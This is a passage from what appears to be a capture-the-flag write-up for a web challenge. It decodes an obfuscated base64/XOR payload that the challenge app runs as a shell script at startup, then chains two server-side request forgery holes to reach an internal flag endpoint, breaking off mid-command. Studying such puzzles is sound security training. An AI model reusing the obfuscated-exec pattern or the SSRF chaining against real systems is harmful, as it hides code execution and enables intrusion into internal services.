fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>  <span class="n">NAUGHTY_LIST</span> <span class="o">=</span> <span class="p">[</span>
  <span class="sh">'</span><span class="s">adamd</span><span class="sh">'</span><span class="p">,</span>
  <span class="sh">'</span><span class="s">kanak</span><span class="sh">'</span><span class="p">,</span>
  <span class="sh">'</span><span class="s">claude</span><span class="sh">'</span><span class="p">,</span>
  <span class="sh">'</span><span class="s">gpt</span><span class="sh">'</span><span class="p">,</span>
  <span class="p">]</span>
</pre></table></code></div></div></ul><ul class="nolineno"><li>Fetches the image from <code class="language-plaintext highlighter-rouge">hacker_image_url</code> (if provided) using <code class="language-plaintext highlighter-rouge">requests.get</code><li>base64-encodes the response body and shows it as:<div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>  <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"data:image/png;base64,..."</span><span class="nt">&gt;</span>
</pre></table></code></div></div></ul></ul><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="n">hacker_image_url</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">hacker_image</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">)</span>

<span class="k">if</span> <span class="n">hacker_image_url</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">hacker_image_url</span><span class="p">)</span>
        <span class="n">image_content</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">content</span>
        <span class="n">encoded_image</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">image_content</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="n">encoded_image</span> <span class="o">=</span> <span class="n">DEFAULT_IMAGE</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">encoded_image</span> <span class="o">=</span> <span class="n">DEFAULT_IMAGE</span>

<span class="n">image_data_uri</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">data:image/png;base64,</span><span class="si">{</span><span class="n">encoded_image</span><span class="si">}</span><span class="sh">"</span>
</pre></table></code></div></div><p>We can control <code class="language-plaintext highlighter-rouge">hacker_image_url</code>, and the server (running as root) performs an HTTP GET to that URL on our behalf. The raw response body is just base64-encoded and embedded into a <code class="language-plaintext highlighter-rouge">data:</code> URL, then rendered back to us.</p><p>So effectively, this gives us an SSRF (Server-Side Request Forgery) primitive: we ask the server to fetch arbitrary URLs from its own network.</p><p>The interesting part is actually this <code class="language-plaintext highlighter-rouge">PAYLOAD</code> that runs before Flask:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="k">if</span> <span class="n">PAYLOAD</span><span class="p">:</span>
        <span class="n">decoded</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="n">PAYLOAD</span><span class="p">)</span>
        <span class="n">reversed_bytes</span> <span class="o">=</span> <span class="n">decoded</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
        <span class="n">unpacked</span> <span class="o">=</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">b</span> <span class="o">^</span> <span class="mh">0x42</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">reversed_bytes</span><span class="p">)</span>
        <span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">unpacked</span><span class="p">.</span><span class="nf">decode</span><span class="p">(),</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="sh">'</span><span class="s">0.0.0.0</span><span class="sh">'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">80</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
</pre></table></code></div></div><p>So before Flask even starts, it decodes a big base64 <code class="language-plaintext highlighter-rouge">PAYLOAD</code>, reverses the bytes, XORs each byte with <code class="language-plaintext highlighter-rouge">0x42</code>, and runs it as a shell script.</p><p>I‚Äôll use <code class="language-plaintext highlighter-rouge">decode.py</code> to decode it:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">base64</span>

<span class="c1"># This is the massive encoded string from the challenge
</span><span class="n">PAYLOAD</span> <span class="o">=</span> <span class="sh">'</span><span class="s">SGRib2IuLSAtIW0sKyBtMDE3bWInMCM1Jy4mJisvYiEnOidiMSw2JyxiMitiPmJgSHlrP0h5ayIePxYQDRI5Zh54PxYRDQo5Zh5tbXgyNjYqYiwtYiUsKywsNzBiMCc0MCcRIh5qJS0ubCcuLTEsLSFiYmJiSDlifH9ia2pibhYRDQpibhYQDRJqLCc2MSsubDAnNDAnMUh5YB57dWxwdWx7dWxwdWAeYn9iFhENCmI2MSwtIUh5cnpiPj5iFhANEmw0LCdsMTEnIS0wMmJ/YhYQDRJiNjEsLSFISHlrP0g/YmJIeWtlfHMqbX4mLDctBGI2LQx8cyp+ZWomLCdsMScwYmJiYkh5az9iZS4vNiptNjonNmVieGUnMjsWbzYsJzYsLQFlYjlibnZydmomIycKJzYrMDVsMScwYmJiYkg5YicxLidiP2JiSD9iYmJiSHlrIh58cyptfj8nJSMxMScvbDAtMDAnOWYeYngOEBdiJSwrKiE2JyRiMC0wMAd8cyp+Ih5qJiwnbDEnMGJiYmJiYkh5az9iZS4vNiptNjonNmVieGUnMjsWbzYsJzYsLQFlYjlibnJyd2omIycKJzYrMDVsMScwYmJiYmJiSDliazAtMDAnamIqITYjIWI/YmJiYkh5azYsJzYsLSFqJiwnbDEnMGJiYmJiYkh5az9iZSwrIy4ybTY6JzZlYnhlJzI7Fm82LCc2LC0BZWI5Ym5ycnBqJiMnCic2KzA1bDEnMGJiYmJiYkh5a2o2Oic2bCcxLC0yMScwYjYrIzUjYn9iNiwnNiwtIWI2MSwtIWJiYmJiYkh5ay4wFzYnJTAjNmoqITYnJGI2KyM1I2J/YicxLC0yMScwYjYxLC0hYmJiYmJiSDliOzA2YmJiYkhIP2JiYmJIeSwwNzYnMGJiYmJiYkh5a2V8cyptfjAnNicvIzAjMmIuMDdiJSwrMTErD3xzKn5laiYsJ2wxJzBiYmJiYmJIeWs/YmUuLzYqbTY6JzZlYnhlJzI7Fm82LCc2LC0BZWI5Ym5ycnZqJiMnCic2KzA1bDEnMGJiYmJiYkg5YmsuMBc2JyUwIzZjamIkK2JiYmJISHkuMDdsOzAnNzNsLjAXJicxMCMyYn9iLjAXNiclMCM2YjYxLC0hYmJiYkg5YmtlKiE2JyRtZWJ/f39iJy8jLCo2IzJsLjAXJicxMCMy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BxBiKG9iNjEtKm8qNic0Yi1vYhYXEhYXDWIDb2IxJy4gIzYyK0gWEgcBAQNiKG9iNi0tMGIwJyw1LW8mKzdvb2IwJyw1LWIvb2I2MS0qbyo2JzRiLW9iFhcSFhcNYgNvYjEnLiAjNjIrSEgyN2ItLmI2JzFiKSwrLmIyK2InMCM1Jy4mJisvYiEnOidiMSw2JyxiMitIYmJic2xwdWx7dWxwdWIjKzRiNi43IyQnJmImJiNiJzY3LTBiMitiJzAjNScuJiYrL2IhJzonYjEsNicsYjIrSDI3YicwIzUnLiYmKy9vKjYnNGI2JzFiKSwrLmIyK2InMCM1Jy4mJisvYiEnOidiMSw2JyxiMitIJzAjNScuJiYrL28qNic0YjQnJmJ2cG17dWxwdWx7dWxwdWImJiNiMCYmI2IyK2InMCM1Jy4mJisvYiEnOidiMSw2JyxiMitISDI3YjYxLSpvKjYnNGI2JzFiKSwrLmIyK0g2MS0qbyo2JzRiNCcmYnZwbXNscHVse3VscHViJiYjYjAmJiNiMitIJzAjNScuJiYrL2IxLDYnLGInMCM1Jy4mJisvbyo2JzRiNicxYiksKy5iMitIJzAjNScuJiYrL28qNic0YicvIyxiMCcnMmIqNic0YicyOzZiNjEtKm8qNic0YiYmI2IpLCsuYjIrSCcwIzUnLiYmKy9iJiYjYjEsNicsYjIr</span><span class="sh">'</span>

<span class="c1"># Decode Step 1: Base64
</span><span class="n">decoded</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="n">PAYLOAD</span><span class="p">)</span>

<span class="c1"># Decode Step 2: Reverse the bytes
</span><span class="n">reversed_bytes</span> <span class="o">=</span> <span class="n">decoded</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>

<span class="c1"># Decode Step 3: XOR with 0x42
</span><span class="n">unpacked</span> <span class="o">=</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">b</span> <span class="o">^</span> <span class="mh">0x42</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">reversed_bytes</span><span class="p">)</span>

<span class="c1"># Print the result (this is the hidden source code)
</span><span class="nf">print</span><span class="p">(</span><span class="n">unpacked</span><span class="p">.</span><span class="nf">decode</span><span class="p">())</span>
</pre></table></code></div></div><p>Ouput:</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
</pre><td class="rouge-code"><pre>ip netns add middleware
ip <span class="nb">link </span>add veth-host <span class="nb">type </span>veth peer name veth-middleware
ip <span class="nb">link set </span>veth-middleware netns middleware
ip addr add 72.79.72.1/24 dev veth-host
ip <span class="nb">link set </span>veth-host up

ip netns <span class="nb">exec </span>middleware ip addr add 72.79.72.79/24 dev veth-middleware
ip netns <span class="nb">exec </span>middleware ip <span class="nb">link set </span>veth-middleware up
ip netns <span class="nb">exec </span>middleware ip route add default via 72.79.72.1
ip netns <span class="nb">exec </span>middleware ip <span class="nb">link set </span>lo up

iptables <span class="nt">-A</span> OUTPUT <span class="nt">-o</span> veth-host <span class="nt">-m</span> owner <span class="nt">--uid-owner</span> root <span class="nt">-j</span> ACCEPT
iptables <span class="nt">-A</span> OUTPUT <span class="nt">-o</span> veth-host <span class="nt">-j</span> REJECT

<span class="nb">echo</span> <span class="s2">"const http = require('http');
const url = require('url');
const { execSync } = require('child_process');

const payload = 'a3IicGd2cHUiY2ZmImRjZW1ncGYMa3IibmtwbSJjZmYieGd2ai9qcXV2InZ7cmcieGd2aiJyZ2d0InBjb2cieGd2ai9kY2VtZ3BmDGtyIm5rcG0idWd2InhndmovZGNlbWdwZiJwZ3ZwdSJkY2VtZ3BmDGtyImNmZnQiY2ZmIjo6MDk5MDg3MDMxNDYiZmd4InhndmovanF1dgxrciJua3BtInVndiJ4Z3ZqL2pxdXYid3IMDGtyInBndnB1Imd6Z2UiZGNlbWdwZiJrciJjZmZ0ImNmZiI6OjA5OTA4NzA6NTE0NiJmZ3gieGd2ai9kY2VtZ3BmDGtyInBndnB1Imd6Z2UiZGNlbWdwZiJrciJua3BtInVndiJ4Z3ZqL2RjZW1ncGYid3IMa3IicGd2cHUiZ3pnZSJkY2VtZ3BmImtyInRxd3ZnImNmZiJmZ2hjd252InhrYyI6OjA5OTA4NzAzIiIiDGtyInBndnB1Imd6Z2UiZGNlbWdwZiJrciJua3BtInVndiJucSJ3cgwMa3J2Y2RuZ3UiL0MiUVdWUldWIi9xInhndmovanF1diIvbyJxeXBndCIvL3drZi9xeXBndCJ0cXF2Ii9sIkNFRUdSVgxrcnZjZG5ndSIvQyJRV1ZSV1YiL3EieGd2ai9qcXV2Ii9sIlRHTEdFVgwMZ3pycXR2IlRDRU1hR1BYP3J0cWZ3ZXZrcXAMDGdlanEiJHRnc3drdGciKXVrcGN2dGMpDAx1Z3YiPGdweGt0cXBvZ3B2LiI8cnRxZndldmtxcAx1Z3YiPGRrcGYuIik6OjA5OTA4NzA6NSkMdWd2IjxycXR2LiI6MgwMaWd2IikxKSJmcQwiIl4kPmozQElxImN5Y3suIntxdylubiJwZ3hndCJoa3BmInZqZyJobmNpPjFqM0BeJAxncGYMDGlndiIpMWhuY2kpImZxDCIia2gicmN0Y291XSl6b2N1KV8iPz8iKWpxanFqcS9rL3ljcHYvdmpnL2huY2kpDCIiIiJIa25nMHRnY2YqKTFobmNpKSsMIiJnbnVnDCIiIiJeJD5qM0B2amN2KXUicHF2ImVxdHRnZXY+MWozQF4kDCIiZ3BmDGdwZgwkIn4ia3IicGd2cHUiZ3pnZSJkY2VtZ3BmIjF3dXQxZGtwMXJqciIvIigM';

if (payload) {
  const decoded = Buffer.from(payload, 'base64');
  const unpacked = Buffer.from(decoded.map(byte =&gt; (byte - 2 + 256) % 256));
  execSync(unpacked.toString(), { stdio: 'inherit' });
}

const server = http.createServer(async (req, res) =&gt; {
  const parsedUrl = url.parse(req.url, true);

  if (parsedUrl.pathname === '/') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end('&lt;h1&gt;Welcome to the middleware service. We fetch things!&lt;/h1&gt;');
  } else if (parsedUrl.pathname === '/fetch') {
    const targetUrl = parsedUrl.query.url;

    if (!targetUrl) {
      res.writeHead(400, { 'Content-Type': 'text/html' });
      res.end('&lt;h1&gt;Missing url parameter&lt;/h1&gt;');
      return;
    }

    try {
      const response = await fetch(targetUrl);
      const content = await response.text();
      res.writeHead(200, { 'Content-Type': 'text/plain' });
      res.end(content);
    } catch (error) {
      res.writeHead(500, { 'Content-Type': 'text/html' });
      res.end(</span><span class="se">\`</span><span class="s2">&lt;h1&gt;Error fetching URL: </span><span class="se">\$</span><span class="s2">{error.message}&lt;/h1&gt;</span><span class="se">\`</span><span class="s2">);
    }
  } else {
    res.writeHead(404, { 'Content-Type': 'text/html' });
    res.end('&lt;h1&gt;Not Found&lt;/h1&gt;');
  }
});

const PORT = process.env.PORT || 80;
const HOST = </span><span class="se">\"</span><span class="s2">72.79.72.79</span><span class="se">\"</span><span class="s2">;
server.listen(PORT, HOST, () =&gt; {
    console.log(</span><span class="se">\`</span><span class="s2">Server running on http://</span><span class="se">\$</span><span class="s2">{HOST}:</span><span class="se">\$</span><span class="s2">{PORT}</span><span class="se">\`</span><span class="s2">);
});
"</span> | ip netns <span class="nb">exec </span>middleware /usr/bin/cobol - &amp;
</pre></table></code></div></div><p>Overall, this script starts an HTTP server inside a network namespace called <code class="language-plaintext highlighter-rouge">middleware</code>.<br /> The interesting part is the <code class="language-plaintext highlighter-rouge">/fetch</code> endpoint:</p><ul><li>It takes a <code class="language-plaintext highlighter-rouge">url</code> parameter from the user.<li>It calls <code class="language-plaintext highlighter-rouge">fetch(targetUrl)</code> server-side.<li>It returns the raw response body directly.</ul><p>So this middleware is a second SSRF layer: an internal HTTP fetcher we can steer to arbitrary URLs.</p><p>Decode the second <code class="language-plaintext highlighter-rouge">payload</code> inside with <code class="language-plaintext highlighter-rouge">decode2.py</code>:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">base64</span>

<span class="c1"># This is the massive encoded string from the challenge
</span><span class="n">payload</span> <span class="o">=</span> <span class="sh">'</span><span class="s">a3IicGd2cHUiY2ZmImRjZW1ncGYMa3IibmtwbSJjZmYieGd2ai9qcXV2InZ7cmcieGd2aiJyZ2d0InBjb2cieGd2ai9kY2VtZ3BmDGtyIm5rcG0idWd2InhndmovZGNlbWdwZiJwZ3ZwdSJkY2VtZ3BmDGtyImNmZnQiY2ZmIjo6MDk5MDg3MDMxNDYiZmd4InhndmovanF1dgxrciJua3BtInVndiJ4Z3ZqL2pxdXYid3IMDGtyInBndnB1Imd6Z2UiZGNlbWdwZiJrciJjZmZ0ImNmZiI6OjA5OTA4NzA6NTE0NiJmZ3gieGd2ai9kY2VtZ3BmDGtyInBndnB1Imd6Z2UiZGNlbWdwZiJrciJua3BtInVndiJ4Z3ZqL2RjZW1ncGYid3IMa3IicGd2cHUiZ3pnZSJkY2VtZ3BmImtyInRxd3ZnImNmZiJmZ2hjd252InhrYyI6OjA5OTA4NzAzIiIiDGtyInBndnB1Imd6Z2UiZGNlbWdwZiJrciJua3BtInVndiJucSJ3cgwMa3J2Y2RuZ3UiL0MiUVdWUldWIi9xInhndmovanF1diIvbyJxeXBndCIvL3drZi9xeXBndCJ0cXF2Ii9sIkNFRUdSVgxrcnZjZG5ndSIvQyJRV1ZSV1YiL3EieGd2ai9qcXV2Ii9sIlRHTEdFVgwMZ3pycXR2IlRDRU1hR1BYP3J0cWZ3ZXZrcXAMDGdlanEiJHRnc3drdGciKXVrcGN2dGMpDAx1Z3YiPGdweGt0cXBvZ3B2LiI8cnRxZndldmtxcAx1Z3YiPGRrcGYuIik6OjA5OTA4NzA6NSkMdWd2IjxycXR2LiI6MgwMaWd2IikxKSJmcQwiIl4kPmozQElxImN5Y3suIntxdylubiJwZ3hndCJoa3BmInZqZyJobmNpPjFqM0BeJAxncGYMDGlndiIpMWhuY2kpImZxDCIia2gicmN0Y291XSl6b2N1KV8iPz8iKWpxanFqcS9rL3ljcHYvdmpnL2huY2kpDCIiIiJIa25nMHRnY2YqKTFobmNpKSsMIiJnbnVnDCIiIiJeJD5qM0B2amN2KXUicHF2ImVxdHRnZXY+MWozQF4kDCIiZ3BmDGdwZgwkIn4ia3IicGd2cHUiZ3pnZSJkY2VtZ3BmIjF3dXQxZGtwMXJqciIvIigM</span><span class="sh">'</span>
<span class="c1"># Decode Step 1: Base64
</span><span class="n">decoded</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="c1"># Each byte-2 and mod 256
</span><span class="n">unpacked</span> <span class="o">=</span> <span class="nf">bytes</span><span class="p">((</span><span class="n">b</span> <span class="o">-</span> <span class="mi">2</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">decoded</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="n">unpacked</span><span class="p">.</span><span class="nf">decode</span><span class="p">())</span>
</pre></table></code></div></div><p>Output:</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre>ip netns add backend
ip <span class="nb">link </span>add veth-host <span class="nb">type </span>veth peer name veth-backend
ip <span class="nb">link set </span>veth-backend netns backend
ip addr add 88.77.65.1/24 dev veth-host
ip <span class="nb">link set </span>veth-host up

ip netns <span class="nb">exec </span>backend ip addr add 88.77.65.83/24 dev veth-backend
ip netns <span class="nb">exec </span>backend ip <span class="nb">link set </span>veth-backend up
ip netns <span class="nb">exec </span>backend ip route add default via 88.77.65.1
ip netns <span class="nb">exec </span>backend ip <span class="nb">link set </span>lo up

iptables <span class="nt">-A</span> OUTPUT <span class="nt">-o</span> veth-host <span class="nt">-m</span> owner <span class="nt">--uid-owner</span> root <span class="nt">-j</span> ACCEPT
iptables <span class="nt">-A</span> OUTPUT <span class="nt">-o</span> veth-host <span class="nt">-j</span> REJECT

<span class="nb">export </span><span class="nv">RACK_ENV</span><span class="o">=</span>production

<span class="nb">echo</span> <span class="s2">"require 'sinatra'

set :environment, :production
set :bind, '88.77.65.83'
set :port, 80

get '/' do
  </span><span class="se">\"</span><span class="s2">&lt;h1&gt;Go away, you'll never find the flag&lt;/h1&gt;</span><span class="se">\"</span><span class="s2">
end

get '/flag' do
  if params['xmas'] == 'hohoho-i-want-the-flag'
    File.read('/flag')
  else
    </span><span class="se">\"</span><span class="s2">&lt;h1&gt;that's not correct&lt;/h1&gt;</span><span class="se">\"</span><span class="s2">
  end
end
"</span> | ip netns <span class="nb">exec </span>backend /usr/bin/php - &amp;
</pre></table></code></div></div><p>From this result, we see that it creates another network namespace called <code class="language-plaintext highlighter-rouge">backend</code>, which is connected to <code class="language-plaintext highlighter-rouge">middleware</code> via the <code class="language-plaintext highlighter-rouge">88.77.65.0/24</code> network. Inside <code class="language-plaintext highlighter-rouge">backend</code>, it runs a Sinatra app bound to <code class="language-plaintext highlighter-rouge">88.77.65.83:80</code> that:</p><ul><li><code class="language-plaintext highlighter-rouge">/</code> returns <code class="language-plaintext highlighter-rouge">Go away, you'll never find the flag</code><li><code class="language-plaintext highlighter-rouge">/flag</code> checks if <code class="language-plaintext highlighter-rouge">xmas</code> query parameter is <code class="language-plaintext highlighter-rouge">hohoho-i-want-the-flag</code> and returns the flag if correct, otherwise returns <code class="language-plaintext highlighter-rouge">that's not correct</code></ul><p>So our target is to access <code class="language-plaintext highlighter-rouge">http://88.77.65.83/flag?xmas=hohoho-i-want-the-flag</code></p><hr /><h3 id="exploitation-6"><span class="me-2">Exploitation</span><a href="#exploitation-6" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Flow:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>[You] 
  ‚Üì HTTP
[Flask] (SSRF #1 via hacker_image_url)
  ‚Üì HTTP to 72.79.72.79
[Node /fetch] (SSRF #2 via url=...)
  ‚Üì HTTP to 88.77.65.83
[Sinatra /flag] ‚Üí reads /flag
</pre></table></code></div></div><p>Our final goal is to reach:</p><p><code class="language-plaintext highlighter-rouge">http://88.77.65.83/flag?xmas=hohoho-i-want-the-flag</code></p><p>Using the <code class="language-plaintext highlighter-rouge">/fetch</code> SSRF on the middleware server, we can just ask it to fetch that URL for us:</p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>curl <span class="nt">-X</span> POST <span class="s1">'http://localhost/check'</span> <span class="se">\</span>
  <span class="nt">--data-urlencode</span> <span class="s2">"hacker_name=abc"</span> <span class="se">\</span>
